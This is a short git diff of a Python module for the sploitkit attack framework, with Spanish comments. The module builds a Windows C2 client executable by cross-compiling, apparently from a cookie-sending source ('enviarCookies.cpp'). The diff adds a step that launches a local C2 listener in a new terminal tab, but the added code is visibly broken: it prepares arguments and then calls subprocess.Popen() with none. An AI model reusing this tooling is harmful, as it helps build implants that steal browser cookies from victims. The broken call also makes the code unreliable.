@@ -2,6 +2,7 @@ from sploitkit import *
 import os
 import subprocess
 from template import Procedure
+import time
 
 class multi_stage_channels(Module):
 	""" Genera un ejecutable para conectar un cliente al servidor c2 (transportc2)
@@ -88,4 +89,8 @@ class multi_stage_channels(Module):
 		#i686-w64-mingw32-g++ enviarCookies.cpp -o envia -static-libgcc -static-libstdc++ -lwsock32
 		args = ["i686-w64-mingw32-g++", fullname, "-o", outfile, "-static-libgcc", "-static-libstdc++", "-lwsock32"]
 		subprocess.Popen(args)
-		print("Compilado {}.".format(outfile))
+		print("Compilado {}".format(outfile))
+		print("Ejecutando listener C2.")
+		time.sleep(5)
+		args = ['terminator', '--new-tab', '-x', 'python3', 'base/modules/c2localclient/c2clientelocal.py']
+		subprocess.Popen()
